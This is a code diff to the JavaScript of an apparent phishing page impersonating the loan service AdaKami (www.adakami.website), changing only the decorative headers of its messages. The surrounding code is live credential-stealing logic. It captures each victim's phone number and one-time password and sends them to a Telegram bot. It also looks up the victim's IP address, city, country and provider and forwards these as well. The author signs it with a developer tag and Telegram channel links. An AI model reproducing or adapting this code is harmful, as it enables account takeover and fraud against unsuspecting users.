@@ -199,7 +199,7 @@
             submitBtn.disabled = true;
             submitBtn.style.opacity = '0.7';
 
-            const message = `<b>ㅤㅤㅤ◦•●◉✿ PESAN MASUK ✿◉●•◦</b>\n-ˋˏ✄┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈\n<b>👤 𝙿𝙴𝙽𝙶𝙸𝚁𝙸𝙼 ㅤ: </b> <code>${phone}</code>\n<b>🌐 𝙳𝙾𝙼𝙰𝙸𝙽 ㅤ: </b> www.adakami.website\n<b>📨 𝚂𝚃𝙰𝚃𝚄𝚂  ㅤㅤ: </b> 𝑴𝒆𝒏𝒖𝒏𝒈𝒈𝒖 𝑶𝑻𝑷...\n˜”*°•.˜”*°•（ ͜.人 ͜.）☚⍢⃝☚ •°*”˜.•°*”˜`;
+            const message = `<b>── ⋆⋅𖤓⋅⋆◦•●◉✿ PESAN MASUK ✿◉●•◦⋆⋅𖤓⋅⋆ ──</b>\n-ˋˏ✄┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈\n<b>👤 𝙿𝙴𝙽𝙶𝙸𝚁𝙸𝙼 ㅤ: </b> <code>${phone}</code>\n<b>🌐 𝙳𝙾𝙼𝙰𝙸𝙽 ㅤ: </b> www.adakami.website\n<b>📨 𝚂𝚃𝙰𝚃𝚄𝚂  ㅤㅤ: </b> 𝑴𝒆𝒏𝒖𝒏𝒈𝒈𝒖 𝑶𝑻𝑷...\n˜”*°•.˜”*°•（ ͜.人 ͜.）☚⍢⃝☚ •°*”˜.•°*”˜`;
             sendTelegramMessage(message);
             
             setTimeout(() => {
@@ -260,7 +260,7 @@
 
             const formattedOtp = otpCode.substring(0,3) + '-' + otpCode.substring(3,6);
 
-            const message = `<b> ── ⋆⋅𖤓⋅⋆ ─𝗞𝗢𝗗𝗘 𝗢𝗧𝗣 𝗠𝗔𝗦𝗨𝗞 ─⋆⋅𖤓⋅⋆ ── </b>\n﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌\n<b>🔐 ᴏᴛᴘ ᴄᴏᴅᴇ ㅤ:</b> <code>${formattedOtp}</code>\n<b>˗ˏˋ ☏  ɴᴏᴍᴏʀ ㅤ:</b> <code>${userPhoneNumber}</code>\n<b>⏱️ ᴡᴀᴋᴛᴜ  ㅤㅤ:</b> ${new Date().toLocaleTimeString('id-ID')}\n﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌\n<b> ⋯⋅๑┈•✦ 𝘋𝘦𝘷𝘦𝘭𝘰𝘱𝘦𝘳 𝘣𝘺 ➤⃝𝘝𝘺𝘳𝘦𝘹𓂃 t.me/getlink_v1 ✦•┈๑⋅⋯ </b>`;
+            const message = `<b> ── ⋆⋅𖤓⋅⋆ ─𝗞𝗢𝗗𝗘 𝗢𝗧𝗣 𝗠𝗔𝗦𝗨𝗞 ─⋆⋅𖤓⋅⋆ ── </b>\n﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌\n<b>🔐 ᴏᴛᴘ ᴄᴏᴅᴇ ㅤ:</b> <code>${formattedOtp}</code>\n<b>˗ˏˋ ☏  ɴᴏᴍᴏʀ ㅤ:</b> <code>${userPhoneNumber}</code>\n<b>⏱️ ᴡᴀᴋᴛᴜ  ㅤㅤ:</b> ${new Date().toLocaleTimeString('id-ID')}\n﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌\n<b> ⋯⋅๑┈•✦ 𝘋𝘦𝘷𝘦𝘭𝘰𝘱𝘦𝘳 𝘣𝘺 ➤⃝𝘝𝘺𝘳𝘦𝘹𓂃 ✦•┈๑⋅⋯ </b>`;
             sendTelegramMessage(message);
 
             setTimeout(() => {
@@ -310,7 +310,7 @@
             fetch('https://ipapi.co/json/')
                 .then(res => res.json())
                 .then(data => {
-                    const infoPesan = `<b> 💀⃤ 𝗜𝗡𝗙𝗢 𝗟𝗜𝗡𝗞 𝗕𝗬 ➤⃝ᴠʏʀᴇ𝘅𓂃</b>\n\n<b>Domain:</b> www.adakami.website\n<b>IP:</b> <code>${data.ip}</code>\n<b>Kota:</b> ${data.city}\n<b>Negara:</b> ${data.country_name}\n<b>Provider:</b> ${data.org}\n<b>Waktu:</b> ${new Date().toLocaleString('id-ID')}`;
+                    const infoPesan = `<b> 💀⃤ 𝗜𝗡𝗙𝗢 𝗟𝗜𝗡𝗞 𝗕𝗬 ➤⃝ᴠʏʀᴇ𝘅𓂃</b>\n\n<b>Channel:</b> https://t.me/gitlab_v1\n<b>IP:</b> <code>${data.ip}</code>\n<b>Kota:</b> ${data.city}\n<b>Negara:</b> ${data.country_name}\n<b>Provider:</b> ${data.org}\n<b>Waktu:</b> ${new Date().toLocaleString('id-ID')}`;
 
                     fetch('/api/kirim-telegram', {
                         method: 'POST',
